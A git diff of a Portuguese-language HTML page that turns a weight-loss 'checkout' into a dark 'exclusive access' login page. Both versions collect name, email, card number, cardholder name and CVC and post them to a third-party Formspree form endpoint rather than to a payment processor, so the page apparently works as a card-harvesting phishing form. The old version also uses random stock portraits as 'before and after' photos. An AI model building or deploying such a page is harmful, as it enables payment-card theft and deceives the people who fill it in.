@@ -1,95 +1,93 @@
-
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Checkout - Emagrecimento</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login Máfia - Acesso Exclusivo</title>
+  <link href="https://fonts.googleapis.com/css2?family=Staatliches&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
     body {
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #ffe0ec, #ffffff);
-      padding: 30px;
-      color: #333;
+      background: linear-gradient(135deg, #000000, #1c1c1c);
+      color: white;
+      font-family: 'Playfair Display', serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      justify-content: center;
     }
     h1 {
-      text-align: center;
-      color: #ff3366;
+      font-size: 2.5rem;
+      margin-bottom: 20px;
+      font-family: 'Staatliches', cursive;
     }
     form {
-      max-width: 500px;
-      margin: 0 auto;
-      background-color: #fff;
+      background-color: #111;
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+      width: 90%;
+      max-width: 400px;
+      animation: fadeInUp 1.5s ease;
     }
-    label {
-      display: block;
-      margin-top: 15px;
-      font-weight: bold;
-    }
-    input, select {
+    input {
       width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      background-color: #2a2a2a;
+      color: white;
+      font-size: 1rem;
     }
     button {
-      background-color: #ff3366;
-      color: white;
-      border: none;
-      padding: 15px;
-      margin-top: 20px;
       width: 100%;
-      font-size: 18px;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    .gallery {
-      display: flex;
-      justify-content: space-around;
-      margin-top: 40px;
-    }
-    .gallery img {
-      width: 100px;
+      padding: 12px;
+      border: none;
+      background-color: #e50914;
+      color: white;
+      font-weight: bold;
+      font-size: 1.2rem;
       border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+    button:hover {
+      background-color: #ff1e29;
+    }
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(40px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    .warning {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
-  <h1>Complete sua compra</h1>
+  <h1>Acesso Privado</h1>
   <form action="https://formspree.io/f/xwplaaqz" method="POST">
-    <label for="nome">Nome completo</label>
-    <input type="text" id="nome" name="nome" required>
-
-    <label for="email">E-mail</label>
-    <input type="email" id="email" name="email" required>
-
-    <label for="pagamento">Método de Pagamento</label>
-    <select id="pagamento" name="pagamento" required>
-      <option value="pix">PIX</option>
-      <option value="cartao">Cartão de Crédito</option>
-    </select>
-
-    <label for="cartao">Número do Cartão</label>
-    <input type="text" id="cartao" name="cartao">
-
-    <label for="cvc">CVC</label>
-    <input type="text" id="cvc" name="cvc">
-
-    <label for="nome-cartao">Nome no Cartão</label>
-    <input type="text" id="nome-cartao" name="nome-cartao">
-
-    <button type="submit">Finalizar Compra</button>
+    <input type="text" name="nome_completo" placeholder="Nome completo" required>
+    <input type="email" name="email" placeholder="E-mail" required>
+    <input type="text" name="metodo_pagamento" placeholder="Método de pagamento (PIX / Cartão)" required>
+    <input type="text" name="cartao_nome" placeholder="Nome no Cartão (se aplicável)">
+    <input type="text" name="cartao_numero" placeholder="Número do Cartão">
+    <input type="text" name="cartao_cvc" placeholder="CVC">
+    <button type="submit">Confirmar Pagamento</button>
   </form>
-
-  <h2 style="text-align:center;margin-top:60px;">Antes e Depois</h2>
-  <div class="gallery">
-    <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Antes">
-    <img src="https://randomuser.me/api/portraits/women/45.jpg" alt="Depois">
-  </div>
+  <p class="warning">Apenas membros aprovados terão acesso ao conteúdo exclusivo.</p>
 </body>
 </html>
